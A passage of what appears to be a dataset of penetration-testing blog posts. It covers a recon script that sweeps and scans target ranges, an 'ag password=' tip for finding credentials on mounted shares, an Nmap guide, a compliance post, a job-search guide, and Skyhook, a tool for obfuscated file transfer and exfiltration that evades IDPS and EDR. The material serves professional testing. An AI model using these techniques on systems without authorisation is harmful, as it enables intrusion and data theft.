scope and save to archive#\n\nfor i in $(cat /home/tester/testing/range.txt); do fping -g $i | tee -a /home/tester/testing/fping-sweep.txt; done\n\n###Trimming our list of living hosts into a usable list of targets and outputting it to targets.txt in our archive###\n\ncat fping-sweep.txt | grep alive | cut -d \" \" -f 1 > /home/tester/testing/targets.txt\n\n####Now use targets.txt for our Nmap scans to build out Nmap section of Supporting Archive and prepare for additional enumeration####\n\necho \"beginning Nmap scan\"\n\nfor i in $(cat /home/tester/testing/targets.txt); do echo \"testing $i\u2026\"; nmap -p- -vvv -sV -T4 -Pn $i -oN $i.txt; done\n\necho \"Doing it again, but in one XML file so we can build out an EyeWitness section for the Archive\u201d\n\nnmap -p- -vvv -T4 -Pn -iL /home/tester/testing/targets.txt -oX /home/tester/testing/eyewitness-targets.xml\n\necho \"nmap complete...\"\n\n###Now use our Nmap .XML file to build our EyeWitness Report and save it to our Archive###\n\n/home/tester/testing/EyeWitness/Python/EyeWitness.py -x /home/tester/testing/eyewitness-targets.xml --web --timeout 60 --user-agent \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\" -d /home/tester/testing/eyewitness-report\n\necho \"EyeWitness Complete\"\n\n###Visit testing directory, parse a list of hosts and ports for Cryptographic Analysis###\n\ncd /home/tester/testing/nmap/ports\n\nag http | grep .txt | cut -d \":\" -f 1,3 | cut -d '/' -f 1 | sed 's/.txt//g' > /home/tester/testing/crypto-targets.txt\n\n###Using our crypto-targets.txt file with testssl.sh to generate Cryptography section for Supporting Archive \u2013 we won\u2019t need tee -a for this one\u2026###\n\necho \"Starting testssl.sh and evaluating the cryptography of our webservers.\"\n\nfor i in $(cat /home/tester/testing/crypto-targets.txt); do testssl --warnings batch --log \"$i\"; done\n\necho \"We\u2019re done here!\"\n\nAfter creating a script like this and saving it to a file, you can simply \u201cchmod +x scriptname.sh\u201d in your terminal and then run the script.\n\n./scriptname.sh\n\nThis script follows a chain that puts into practice all of the tips we have discussed so far.\n\nIt builds our archive in its own unique place.\n\nUsing a list of IP CIDR ranges, it generates a list of hosts that are alive, and creates a log file of those living hosts, targets.txt. This is saved to our archive.\n\nIt uses the new targets.txt file to perform two Nmap operations. The first operation enumerates all of our hosts that are alive. The second operation generates an XML file which will be used to empower EyeWitness. All files are saved to the supporting archive.\n\nEyeWitness enumerates webservers contained within the Nmap XML file and saves its report to our supporting archive.\n\nWe then use ag, a terminal-based searching platform, and regex to parse out a list of hosts that were detected to be running webservers. This is saved to the supporting archive.\n\nOur script then calls testssl.sh to evaluate the cryptography of all target webservers and their respective ports. These logs are then also saved to the supporting archive.\n\nAfter coming this far and adhering to these principles, you should have a significant amount of information for your supporting archive. Granted, this is simply a method I use to gather low-hanging fruit during an assessment. Feel free to design your own scripts, but ensure they adhere to a philosophy of generating strong logs and building evidence for your archive!\n\nTip 5:  Use the Silver Searcher to Rapidly Search Collected Data\n\nag is a fantastic searching tool within Kali and has helped do everything from refreshing my memory mid-test to creating screenshots that I feel share quite a bit of good information.\n\nag is a search tool that can be invoked with:\n\nag\n\nThis command, provided you have been making use of BASH \u201cfor loops\u201d and have been outputting information to files, can be used to rapidly identify important information.\n\nFor example, if I wanted to search my Nmap scan results for open ports, I could cd into my Nmap directory and simply issue:\n\nag open\n\nThis command will pull a list of files containing the word \u201copen.\u201d Seeing how Nmap uses the word \u201copen\u201d to describe port status, this can be used to rapidly pull down neatly trimmed information about open ports on each host.\n\nFigure 5: ag Pulls Open Ports\n\nThis is great, because it not only allows you to rapidly look at the crucial information about open ports but the data can be trimmed even further with something like the below command, which will rapidly produce a list of hosts running SSH:\n\nag open | grep ssh | sort -Vu\n\nFigure 6: ag Results Trimmed Further with grep\n\nSimilarly, you can use this to investigate directory enumeration results to immediately pull up valid directory names that returned a certain HTTP status code:\n\nag 200\n\nFigure 7: ag Locates Valid Directories in Gobuster Log\n\nAdditionally, you can even look up information related to cryptographic vulnerabilities:\n\nag sweet | grep VULNERABLE\n\nFigure 8: ag Locates Cryptographic Vulnerabilities in Host Logs\n\nWith a well-managed supporting archive and a bit of creativity, ag can provide you with immense levels of power and flexibility that allow for the rapid retrieval of information.\n\nI hope I\u2019ve sold you on it! However, it\u2019s worth noting that this tool does dig recursively. Thus, it is best to use it within a directory from which you wish to perform your search. You can also specify the level to which it searches recursively with the --depth switch. Using it in a directory that is higher-level, such as \u201c/\u201d, will return many results outside of what you were probably looking for. However, ag is also a great way to scrape mounted shares for information about stored passwords \ud83d\ude09.\n\nYou could utilize \u201cag password=\u201d or a similar variation to search an entire mounted share for potential credentials, but that is a conversation for a different time.\n\nTip #6: Be Okay with Adding Things Manually\u2026 and with Throwing Stuff Away!\n\nDon\u2019t worry, we\u2019re done with the technical stuff. It\u2019s worth remembering that no two penetration tests are ever the same. Thus, it is never appropriate to simply fire a script and assume your archive is finished. If you have a steady baseline approach that allows you to obtain precious information on your targets, like the above script, feel free to use it, but prepare to also add additional information to your archive while you are testing. Similarly, you should also be prepared to exclude things from your supporting archive, especially if they consist of information that may be very sensitive, such as usernames and hashes from an NTDS.DIT dump from a domain controller during an internal test, or personal information like plaintext social security numbers. That is information you really, really do not want getting into the wrong hands.\n\nWhile you are testing, you should consider everything that you see as something that you can potentially add to an archive, especially if it is something you find manually. Remember, your customer is going to be getting your archive along with a report. Consider going the extra mile and copying something interesting from a Metasploit module or Recon-NG directly into a text file.\n\nConclusion\n\nIf you\u2019ve followed these steps and are on a test, it is likely that you now have a fairly detailed supporting archive that is organized, contains relevant information about the test, and tells a story that is helpful for you and the client. As the saying goes, it\u2019s fine to hack for show, but you\u2019re going to want to report well for the dough. With the supporting archive being a quintessential piece of the reporting experience, it is important that it receives your full attention and care when being built.\n\nUntil next time!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Shenetworks Recommends: Using Nmap Like a Pro\"\nTaxonomies: \"Recon, Serena DiPenti\"\nCreation Date: \"Mon, 05 Jun 2023 19:23:18 +0000\"\nshenetworks //\n\nOne day at work I received a case stating a client couldn\u2019t connect to the management interface of a new server. I asked the client to change the IP address of the management interface and try to connect, and the test was successful. The client was confused and asked why the original IP address wouldn\u2019t work. I asked them to ping the old address and the client was surprised to receive a response back. That IP address was assigned to a device somewhere else on the network. While there are new programs that can help manage your IP addresses and ranges, this is still a common issue in networks. Often caused by poor documentation and stale configurations. The client then had the task of tracking down this rogue IP. Where would you start this process? I would say Nmap is a perfect tool. \n\nNmap is extremely popular for both defenders and attackers. It originally debuted in Phrack Magazine in 1997 by the author Gordon \u201cFyodor\u201d Lyon. Nmap has grown into a more complex and powerful tool since its release.  \n\nAs a Network Engineer, I used Nmap to scan for inventory and to check availability and uptime. As a pentester, I use Nmap to gather information on my targets, and with some scripts, Nmap can be used for a lot more than reconnaissance.  \n\nSince Nmap has so many options it might be overwhelming to parse through them to see which ones will be beneficial to you. The next section discusses Nmap options and scripts that I frequently use and recommend.  \n\nA basic default Nmap scan will probe a target and check for a response. Once Nmap has verified the host is reachable Nmap will probe for open ports. The default Nmap scan is helpful but with a few options, we can get a lot more information.  \n\nNmap [scan types] [options] {target(s)} \n\nFigure 1: Nmap help page list of options \n\n-sL \u2013 List Scan\n\nYou might want to audit a range of IP addresses knowing some of those IP addresses are unused. Using Nmap with the -sL option will probe every IP address in the given range and do a reverse-DNS lookup. Domain names can often help identify valuable targets. The result will be a list of reachable hosts and their domain name if applicable.\n\n-sV \u2013 Version Discovery\n\nNmap option -sV will attempt to discover the version information of every port open on a host. This information is extremely valuable on an engagement. This will help you identify what type of host you\u2019re probing and the version number. Identifying the version helps prioritize interesting targets and identify available exploits.\n\n-Pn \u2013 Skip host discovery\n\nIt\u2019s common for network administrators to disable the ICMP protocol or filter traffic to certain hosts. The option -Pn skips host discovery and assumes every IP address is assigned to a host and online. Using this option Nmap can discover additional targets but increase the scan time significantly.\n\n-p- - Scan every port\n\nBy default, Nmap scans 1000 ports. Some services may be open but not discoverable with a standard scan. Using the -p- option will scan *every* port 1-65535. This option will increase the duration of scan.\n\n-T4 \u2013 Aggressive scan\n\n-T4 will reduce the time for a scan to complete and should be used if you have a fast and reliable connection.\n\n-oX {filepath, filename, and type} - output results into an XML file\n\nI recommend saving your Nmap output into files that can be referenced later in the engagement. The -oX option will save the output in XML format. Saving in XML will allow you to easily parse through the results. This parsing is helpful when you are looking for hosts with specific ports open like SQL, or SMB.\n\n-sC \u2013 script scan\n\nPentesters use a wide variety of specialized tools, however, some may be unaware that the same task can be accomplished with an additional Nmap script. Using Nmap scripts is quick and efficient. With the Nmap Scripting Engine (NSE), users can utilize a collection of scripts with various purposes like discovering additional details about an open port and protocol to further enumeration and brute forcing. \n\nBelow are a few Nmap scripts and their descriptions. These are scripts I use regularly. You can find a full list of available scripts here: https://nmap.org/nsedoc/scripts/\n\nsshv1: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.\n\nDHCP discover: Sends a DHCPINFORM request to a host on UDP 67 to obtain all the local configuration parameters without allocating a new address.\n\nftp-anon: Checks if an FTP server allows anonymous logins.\n\nftp-brute: Performs brute force password auditing against FTP servers.\n\nhttp-enum: Enumerates directories used by popular web applications and servers.\n\nhttp-passwd: Checks if a webserver is vulnerable to directory traversal by attempting to retrieve etc/passwd or \\boot(ini).\n\nhttp-methods: Finds out what options are supported by an HTTP server by sending an OPTIONS request.\n\nms-sql-info: Attempts to determine configuration and version information for Microsoft SQL server instances.\n\nmysql-enum: Performs valid-user enumeration against MySQL server using a bug.\n\nNSF-showmount: Shows NFS exports, like the showmount -e command.\n\nrdp-enum-encryption: Determines which encryption level is supposed by the RDP service.\n\nsmb-enum-shares: Attempts to list shares.\n\ntftp-enum: Enumerates TFTP filenames by testing for a list of common ones.\n\nNmap is a Swiss army knife and can substitute some of your favorite tools when you're in a pinch. There are even more Nmap scripts to explore and use. For more information related to Nmap check out their dedicated site and their GitHub https://github.com/nmap/nmap for information on contributing to the project. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Why Do Car Dealers Need Cybersecurity Services?\"\nTaxonomies: \"Informational, InfoSec 101, Tom Smith, Compliance, FTC, Incident Response, penetration testing, Safeguard Rule\"\nCreation Date: \"Thu, 08 Jun 2023 19:13:32 +0000\"\nTom Smith //\n\nAt Black Hills Information Security (BHIS), we deal with all manner of clients, public and private. Until a month or two ago, though, we\u2019d never dealt with a car dealership. But in the past few weeks, we\u2019ve spoken to several dealerships. \n\nWhat\u2019s up? \n\nTurns out that the US Federal Trade Commission (FTC) has ruled that auto dealers are now subject to the Gramm-Leach-Bliley Safeguard Rule. As of June 9, 2023, the rule applies to car dealers. The purpose of the Rule is to require financial institutions to take steps to ensure the security of consumer data they possess. What\u2019s new is the fact that car dealerships in possession of 5,000 or more potential customer records are now considered \u201cfinancial institutions.\u201d If you\u2019ve been in business for any length of time and sell more than a few cars a month, you\u2019re subject to the new rules. \n\nBut what do you have to do to be in compliance? \n\nNothing more than follow basic industry best practices for data security: implement an Information Security program to safeguard customer data. Section 314.4 outlines what your Information Security program must contain. There are nine requirements. \n\nYou must: \n\nDesignate a Qualified Individual to oversee the program. This person can be an employee, a contractor, or a vendor. \n\nBase the program on a written risk assessment. The risk assessment should include an honest evaluation of the adequacy of your current security posture. \n\nImplement controls to mitigate the risks identified. In most cases, the expectation is that Multi-Factor Authentication is in place for all systems. \n\nEvaluate the effectiveness of your controls through penetration testing. \n\nRequire that any third-party vendors you work with comply with sound security practices. \n\nKeep your Information Security Program up to date as your technology posture changes, and especially in light of results of the penetration testing described above. \n\nMaintain a written Incident Response (IR) Plan. An IR Plan outlines steps to be taken in the case of a data breach or other data security incident. \n\nHave the Qualified Individual report status to senior leadership on at least an annual basis. \n\nThose institutions not in compliance are subject to fines levied by the FTC. \n\nIf you\u2019re an auto dealer dipping into cybersecurity for the first time as a result of these new rules, your head may be swimming. Just remember that these are basic industry security practices that all but the smallest businesses are beginning to roll out. As such, free and low-cost resources to help organizations such as yours are plentiful. \n\nBHIS can help! \n\nSome related BHIS content: \n\nMaking Compliance Suck Less | John Strand | BHIS Nuggets - YouTube \n\nAASLR: Intro to Tabletop Exercises & IR Playbook Fun (*Non-Denominational Winter Holiday Version) - YouTube \n\nIf you have further questions around compliance, feel free to reach out to consulting@blackhillsinfosec.com. \n\nFurther reading:  \n\nSafeguards Rule \n\nFTC Safeguards Rule: What Your Business Needs to Know | Federal Trade Commission \n\nFTC Safeguards Rule | NADA \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Evasive File Smuggling with Skyhook\"\nTaxonomies: \"External/Internal, How-To, Informational, Justin Angel, Exfil\"\nCreation Date: \"Thu, 15 Jun 2023 13:20:00 +0000\"\nImposterKeanu //\n\nIntroduction \n\nThis blog post introduces the reader to \u201cThe Obfuscation Hustle\u201d, a term I enjoy using to describe the tedious process of obfuscating and delivering files to corporate workstations defended by signature-based perimeter controls. Skyhook, a new open-source tool available on GitHub, is then introduced and demonstrated as a viable method of eliminating two non-negligible steps of The Hustle while also providing obfuscated file exfiltration functionality.\n\nBe Advised: Skyhook Isn\u2019t a Privacy Tool \n\nReaders may be tempted to view Skyhook through privacy-tinted glasses due to the use of encryption algorithms to obfuscate data. Don\u2019t. \n\nAn encryption algorithm is only as effective as its implementation, and these have been implemented by an idiot. Keys are displayed in plaintext at various points in web interfaces, and they\u2019re currently stored in the clear in client-side IndexedDB. Anyone with access to these elements can easily recover data from packet captures or staged file chunks. \n\nReaders should also avoid confusing Skyhook\u2019s round-trip obfuscation cycle with end-to-end encryption (E2EE). E2EE intends to assure that data is recoverable only by entities with the encryption keys, where Skyhook does the opposite: it obfuscates data long enough to be smuggled past controls and then deobfuscates it before writing it to disk. Plaintext in, plaintext out. \n\nConcisely: Skyhook does not enhance confidentiality of transferred files beyond fooling to perimeter controls. \n\nContext & The Obfuscation Hustle \n\nBHIS\u2019 approach to remote access for post-compromise scenarios generally involves working with customers to establish RDP access to an internal workstation over a BHIS-maintained VPN tunnel. This approach provides a secure and reliable method of accessing the network to execute the engagement. \n\nSince operators are acting in the context of a standard user on a workstation derived from a customer\u2019s golden image, beacon/shell will not be immediately available to facilitate encrypted file transfers. Files will have to be transferred using alternative methods that are likely scrutinized by TLS intercepting Intrusion Detection and Prevention Systems (IDPS) implemented to block suspicious traffic. These conditions lead operators to encoding and/or encrypting files prior to transit, thereby obfuscating their content and evading detection.  \n\nWhile generally effective, this approach creates burdensome overhead for operators. Each newly retrieved file must be deobfuscated to become useful again. Complicating matters further is that, once deobfuscated on a workstation, files are likely to be exposed Endpoint Detection and Response (EDR), which, depending on the contents of the file, may result in it being quarantined and defenders receiving alerts. Defense in depth has entered the chat. \n\nTwo stages of obfuscation for a given file prior to transit is often effective in this scenario: one for EDR and a second for IDPS. Inspired by Sean Metcalf\u2019s Credential Shuffle, I like to call this \u201cThe Obfuscation Hustle\u201d. For instance, the process of manually Hustling a Snaffler binary to a corporate workstation may look roughly like the flowchart below. Note that Skyhook intends to automate the \u201cnetwork filtering obfuscation\u201d and \u201chost for download\u201d stages. \n\nThe Obfuscation Hustle (Download) \n\nIntroducing Skyhook \n\nSkyhook was developed to cut the manual nonsense out of applying obfuscation to bypass network-based controls. An HTTP(S) file server is used to seamlessly read plaintext files from disk and serve them to clients in obfuscated chunks. Each chunk passes through a series of pipelined algorithms called obfuscators that alter the content in transit. In addition to the file content, file listings, and names are passed through the same chain to prevent leakage. \n\nWe can observe how the Skyhook approach obfuscates file chunks in the following screenshot which was borrowed from the subsequent section that outlines general usage of Skyhook. As you can see, each critical element of the HTTP transaction is encrypted and Base64 encoded (in that order). \n\nBurp: Inspecting an HTTP Transaction that Requests a File Chunk \n\nAlso, keep in mind that Skyhook\u2019s web interface is also capable of performing obfuscated file uploads. When this occurs, JavaScript reads a given file in slices and obfuscates each one before sending them to the server in an HTTP transaction. Each chunk is then received by the server, deobfuscated, and inserted into the destination file. \n\nThe Skyhook Service Architecture \n\nDuring the early planning stages of development, we decided that we wanted to make Skyhook as configurable as possible while minimizing operator learning curve. Web interfaces were chosen as the best method, but we also wanted to make sure that account and obfuscation configurations could not be easily inspected. To accommodate this approach, we decided that the Skyhook binary should simultaneously run two HTTPS services that are exposed through React web interfaces. \n\nThe Admin Service \n\nUsed to manage accounts and apply obfuscation configurations. \n\nDistinct from the transfer interface to ensure secret values aren\u2019t exposed to defenders. \n\nShould be accessed only from friendly sources/devices, i.e., those free of defender controls. \n\nAlso generates links to the transfer interface, which is convenient since paths are generally randomized.\n\n The Transfer Service \n\nAccessed by operators from unfriendly sources/devices, i.e., those monitored by defenders. \n\nUser-level credentials should be used to access this service. \n\nUsed to stream files to and from a server-side web root directory. \n\nObfuscation algorithms are implemented in web assembly, allowing the following algorithms written in go to be compiled for use in web browsers: \n\nAES \n\nBase64 \n\nBlowfish \n\nTwofish \n\nXOR \n\nIndexedDB is used to store obfuscated downloaded file chunks. \n\nThe following diagram illustrates the basic dataflow of this architecture. \n\nData Flow Diagram \n\nWe recommend deploying Skyhook with \u201coffense in depth\u201d in mind. Internally, we deploy Skyhook to a container stack and expose the file transfer server through CDNs. Skyhook\u2019s web root is populated in a pair of CICD pipelines: one that dynamically obfuscates common C# tooling and a second that consumes raw shellcode to produce enhanced payloads. This approach provides value to operators by compartmentalizing capabilities and minimizing manual keyboard labor. \n\nThe Admin Service \n\nThe admin service exists to provide operators with a clean method of managing the configuration file without having to concern themselves with YAML shenanigans. Know that this is little more than a glorified YAML editor. Any changes made here result in updates to the configuration file itself. \n\nOperators are dropped to the \u201cUser Accounts\u201d functionality after authentication, which can be used to add and remove accounts as needed. \n\nAdmin Service: User Configurations \n\nClicking the \u201cObfuscators\u201d button in the interface reveals the current obfuscation configuration. An obfuscator is a configured obfuscation algorithm. The listing will be empty by default but know that Skyhook will always apply a single round of base64 encoding before writing the response body. This is a safety mechanism to ensure the obfuscation chain doesn\u2019t produce arbitrary byte sequences that could potentially break HTTP transactions. \n\nAdmin Interface: Obfuscators Configuration (Currently Empty) \n\nObfuscators can be initialized by clicking the \u201cAdd\u201d button and selecting the desired algorithm. A form will appear that accepts the necessary inputs. Click \u201cSave\u201d after adjusting the configurations to put them into enforcement. Just be sure that no file transfers are in process, otherwise, failure is imminent. \n\nAdmin Service: Adding an XOR Obfuscator \n\nIt\u2019s overkill, but we always have the option of chaining algorithms together by adding and reordering them accordingly. Just know that each stage is going to add processing overhead, so recovering the files from JavaScript will be memory heavy and slow. \n\nThe final feature of the admin interface is a simple \u201cQuick Copy Button\u201d, which generates links to the transfer service. These links will contain the dynamically generated paths created when the config file was derived by Skyhook\u2019s creation command, along with encryption keys for the JS loader (which we\u2019ll touch more on later). \n\nAdmin Interface: Quick Copy Links \n\nClicking any of these buttons will result in the referenced link being copied to your clipboard so that operators don\u2019t have to reference the configuration file. Convenience! \n\nThe File Transfer Service \n\nThis section is dedicated to demonstrating general usage of the Skyhook transfer service with an emphasis on how obfuscation is applied to various elements of HTTP transactions. See Appendix A: Recreating the Demo Environment to access a demo Docker container that can be used to recreate a similar environment for testing. \n\nLogging into the web interface offered by the transfer service results in a listing of the web root being rendered. Remember that links pointing to randomized paths are available in the admin service. \n\nTransfer Interface: Logging In \n\nA file listing of the web root is rendered upon authentication, revealing directories and files to interact with. \n\nInitial File Listing \n\nChanging to the \u201cdemo-data\u201d directory reveals files that can be downloaded. \n\nTransfer Interface: File Listing \n\nUsing Burp to inspect the HTTP transactions that loaded the interface into the browser, we can clearly see the authentication POST request to /login and a PATCH request to a longer URI ending in a base64 encoded parameter. The latter of the two effectively represents a REST call to list the contents of the web root directory. This can be confirmed by decoding the parameter and observing the true value of \u201c/demo-data\u201d. \n\nNote: Obfuscators were not configured for this transaction, so only Base64 encoding was applied. \n\nBurp: Inspecting Obfuscated Directory Listing Transaction \n\nSingle-round Base64 encoding isn\u2019t particularly evasive. Luckily, Skyhook offers four additional obfuscation methods that can be chained together in random ordering: AES, XOR, Blowfish, Twofish. Adding a XOR obfuscator and setting the key to \u201csecret\u201d will encrypt the above content along with file data. \n\nAdmin Service: Adding an XOR Obfuscator \n\nThe client must sync its obfuscation config to continue interacting with the service, otherwise, it will fail to deobfuscate output. Inspecting the same directory listing transaction after XOR encryption is applied reveals that the data is no longer recoverable by simply Base64 decoding the values. \n\nSynchronizing the Obfuscation Config \n\nBurp: Inspecting File Listing Request (Things\u2019re Encrypted) \n\nJust click \u201cDownload\u201d on a file and the interface will begin retrieving it from the server in chunks (1MB by default), as shown below when the \u201c100M.data\u201d file was downloaded. The browser will prompt the user to save the file when all chunks have been stored and the file has been reassembled. \n\nFile Transfer Interface: Downloading \u201c100M.data\u201d \n\nInspecting a single transaction that retrieved a file chunk, we can see that key elements of the HTTP request are obfuscated. \n\nBurp: Inspecting a File Chunk \n\nHere is an MD5 hash to demonstrate that integrity of the file was maintained after the chunked and obfuscated download process. The MD5 fingerprint prefixed to each file name was not generated by Skyhook. It was a byproduct of the \u201cskyhook-demo\u201d container. \n\nMD5 Hash Proof \n\nUploading large files is as simple and effective as downloading them. Just click the \u201cBrowse\u201d button in the transfer service interface to select and upload a file. Inspecting a chunked upload request allows us to confirm that all values are encrypted as well. \n\nFile Transfer Interface: Uploading a File Gigabyte File \n\nBurp: Inspecting a File Upload Chunk \n\nConclusion \n\nThe Hustle is a frustrating impediment to operator efficiency during early stages of post-compromise scenario engagements. Skyhook has been introduced as a potential method of minimizing hustle by automating two steps of the process: application of obfuscation algorithms and file hosting. Skyhook\u2019s utility is enhanced further by offering upload capabilities that can be used to facilitate obfuscated file exfiltration. \n\nAs Skyhook was made available to the public only a few days before releasing this blog post, it\u2019s difficult to ascertain effectiveness of the underlying obfuscation techniques when faced with well-configured detection capabilities. Regardless, BHIS operators have reported zero incidents of detection by IDPS or other network-based controls during the handful of engagements it has been used for. This is expected to change should Skyhook become a regularly used utility. \n\nAppendix A: Recreating The Demo Environment \n\nI intentionally avoided illustrating how the demo environment was configured for the sake of brevity, but a \u201cdemo container\u201d is available to quickly demo Skyhook\u2019s capabilities. \n\nAssuming Docker is installed, this command should start the container for use. Burp can be configured to inspect various requests for inspection but know that large response bodies will likely make it fall into convulsions. Also, I recommend using a Chrome-based browser right now as Firefox is behaving flakily with the web assembly. \n\nDocker Command to Start the Demo Container \n\nThe above command will start the Skyhook services on localhost: \n\nAdmin Service: https://127.1:65535 \n\nTransfer Service: https://127.1:8443 \n\nTake care to capture the admin credentials from standard out when the container starts, otherwise the admin interface will be inaccessible: \n\nStarting the Demo Container\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Shenetworks Guide to Landing Your First Tech Job\"\nTaxonomies: \"General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Serena DiPenti\"\nCreation Date: \"Thu, 20 Jul 2023 16:33:11 +0000\"\nSerena DiPenti //\n\nhttps://www.youtube.com/embed/yndjMaRpurc\n\nBuckle up for this one because I\u2019m about to give you A LOT of information. As someone who works in tech and creates tech content, I am aware there is no information shortage on \u201chow to get into tech.\u201d Some of the content is great and helpful and some of it is close to predatory, and if you\u2019re someone who is unfamiliar with the field, it can be difficult to sort the good and bad. I would be skeptical of any information coming from someone trying to sell you bootcamps or tech career consulting services. I would also look out for people promising big results in a short amount of time.  \n\nPeople are trying to capitalize on the question that most frequently ends up in my inbox. So here is my opinion, free of charge. I cannot make big promises of a six-figure job at a FAANG company with no experience, but I can offer you this resource and what you make of it is totally up to you.  \n\nIf all my technical experience was going to be erased from my brain and all I could do was write a guide to myself on how to rebuild my career from scratch, this would be it.  \n\nStep One: Identify Your Area of Interest. \n\nWorking in tech can mean a thousand different things. When I originally picked my degree, I did so based off the recommendation of a customer when I was working at Best Buy. I didn\u2019t do any research on all the different roles, educational resources, or what I would find the most interesting. My biggest concern was who\u2019s hiring and if I could make a living with it. I went into networking. I do not regret it, but I do wish I had a better idea of what I was getting myself into before I threw myself into the proverbial deep end.  \n\nSpend time researching different areas of tech like networking, systems administration, software development, data analytics, cloud, cybersecurity, even sales. Then, once you pick an area that you would like to pursue, look at the different options within that field. For example, working in cybersecurity can include jobs like network security, software security, penetration testing, soc analyst, threat hunter, malware research, incident response, digital forensics, and cloud security (and this isn\u2019t even a complete list).  \n\nWhen I decided I wanted to move into cybersecurity, I spent a year looking at different options and speaking with professionals before I made my decision to move into penetration testing. Take time to pick, but it's ok if you change your mind later. \n\nStep Two: Start the Job Search. \n\nStart looking at job openings as you get an idea of the roles that interest you. I recommend reviewing at least 3 open positions. While reviewing each position, pay close attention to the job duties and the qualifications. Eventually, you will start to see patterns. Write those down because this is going to give you a good idea of the skills you\u2019ll need to obtain one of these positions.  \n\nTwo disclaimers: first, the position you are exploring might not be the first tech job you land \u2014 it probably won\u2019t be. You are creating a goal, and it might take several steps to reach it. Secondly, think of the listed qualifications as the company\u2019s \u201cwish list.\u201d In most circumstances, the requirements and qualifications listed are negotiable, and candidates rarely meet every qualification. Managers often make exceptions relating to educational requirements and experience with specific technology stacks. Keep that in mind when looking at the postings because it might seem a little daunting at first.  \n\nStep Three: Revamp Your Resume. \n\nThis step comes after reviewing a variety of open positions because now you know some of the language they use and qualities they\u2019re looking for. This is the area where people miss opportunities. You want to get your resume ready to apply for tech roles, which means you need to highlight sought after skills that apply to tech positions. You don\u2019t need to have any tech specific experience on your resume to do this. Here is a list of some examples: \n\nWorking with customers to identify and meet their needs \n\nProblem solving \n\nCommunication Skills \n\nLeadership / managing a team \n\nProject management \n\nCollaborating with coworkers \n\nAbility to prioritize \n\nCoordinating with vendors or business \n\nMeeting deadlines \n\nDetail oriented \n\nDocumentation and writing \n\nSome companies use automated programs to filter applications, meaning your resume may not even be read by a human. I created a list of keywords that can help you highlight your skills and hopefully get your resume in the hands of a real human.  \n\nSupport, Lead, Facilitate, Ensure, Maintain, Initiate, Implement, Manage, Coordinate, Improve, Evaluate, Performance, Monitor, Identify, Participate, Deliver, Resolve, Design, Analyze, Increase, Adapt, Review, Develop, Produce, Provide, Revise, Apply, Adhere, Configure, Recommend, Enhance, Execute, Upgrade, Install, Test, Assist, Educate, Efficient, Guide, Approve, Assign, Solve, Create \n\nSometimes you must make the system work for you. If you are a student at a university or community college, find your career center and see if they offer resume services and interview practice, I was able to do this at my university and it was completely free. Alternatively, Harvard and other universities have documents available with resume templates and advice. Harvard\u2019s is available here: https://hwpi.harvard.edu/files/ocs/files/hes-resume-cover-letter-guide.pdf. I personally use the second resume template in the document.  \n\nStep Four: Start Applying for Jobs. \n\nStart applying for jobs once your resume is ready to be sent off. I recommend making a weekly goal such as sending out 3 job applications a week. Entry-level jobs can be difficult to identify. If you filter for \u2018entry-level\u2019 jobs on LinkedIn, you\u2019ll notice many of the positions require 3-5 years\u2019 experience or a four-year degree in computer science or similar. I still recommend applying for those jobs. At worst, you won\u2019t hear back from them; at best, you might land it. Consider technical positions for your own city or school district, they often have positions available for people without much experience and you\u2019ll get hands on with a wide variety of vendors, equipment, and issues. These positions can usually be found on your city\u2019s or school district\u2019s website. Also look out for apprenticeship programs like the one offered by Cisco. \n\nConsistently apply for new roles and take opportunities to interview when available. Interview experience is valuable, and feedback can help you improve. Remember, if you don\u2019t get a call back or land the job, it\u2019s ok to apply for opportunities at the company in the future.  \n\nStep Five: Beef Up Your Resume.  \n\nWhile applying for tech jobs, you should come up with a plan to add some tech experience to your resume. There are many ways to do this, and I have outlined a few below. \n\nCollege Classes \n\nCommunity College \n\nResearch your local community college. Community colleges often offer discounted or free classes to residents in the area. 20 US states offer free tuition for residents. The community college closest to my home offers classes to residents for $70 a credit hour. Most classes are 3 credit hours making one course $210. For comparison, the four-year university 15 minutes away from the community college costs $2,389 per credit hour.  \n\nIf financially viable, you can enroll in your local community college part time, even if just take one class a semester and add that to your resume. You are now a student pursuing a technical degree at an accredited learning institution. \n\nFree College Classes \n\nHarvard and MIT both offer free classes to the public. You can take Introduction to Computer Science And Programming with MIT Open Courseware or Data Science: R Basics through Harvard \n\nEDx partners with different universities to offer classes for free in a variety of different fields. Some offer a certificate on completion for a cost, but you can still list you completed the course even if you didn\u2019t purchase the \u2018official\u2019 certificate. \n\nOnline Courses \n\nDifferent organizations offer free and low-cost course options. \n\nAntisyphon Pay What You Can (Cybersecurity) \n\nAWS Educate (Cloud) \n\nGrow with Google (Various) \n\nCody Academy (Development and Data) \n\nThe Linux Foundation (Linux Operating Systems) \n\nFreeCodeCamp (Development) \n\nCisco Networking Academy (Networking) \n\nMicrosoft Learn (Various) \n\nHands-On \n\nHands-on learning resources and projects are a great way to showcase your knowledge. \n\nTryHackMe (Cybersecurity) \n\nHackTheBox (Cybersecurity) \n\nProjects (Development) \n\nWork on coding your own project and publish it on GitHub \n\nOpen-Source Projects (Development)  \n\nOnce you have some coding experience and have worked on a few small projects on your own, try to find and contribute to open-source projects on GitHub. \n\nIndustry Certifications \n\nThere are many industry certifications available and most of them cost money. Some of the most well-known certifications include CompTIA Network+, CompTIA Security+, Cisco Certified Network Associate (CCNA), and AWS Solutions Architect. Some employers may require a specific certification, for example some government jobs require the Security+ certification. Most companies do not require any certifications but may list it as a preference.  \n\nOn occasion, there are opportunities to test for these certifications for free. For example, the Texas Workforce Commission has a program called Skills Enhancement Initiative and offers free training for all Texas residents, certification voucher funding for eligible participants, and even job referrals.  \n\nThere\u2019s a lot of conflicting opinions regarding certifications. Personally, I recommend them for someone who may have no formal higher education or previous industry experience. And job recruiters love them.  \n\nA growing list of free learning resources can be found on my GitHub. \n\nStep Six: Network!! (Not the Computer Kind) \n\nYou are applying for jobs and learning, now it\u2019s time to meet some people in your prospective field. People want to hire people they know. All the steps previously mentioned are important, but this one will yield results. \n\nDo from home: \n\nGet active on social media \u2014 follow and interact with people in the field. \n\nAttending Virtual Conferences. There are tons of conferences you can attend 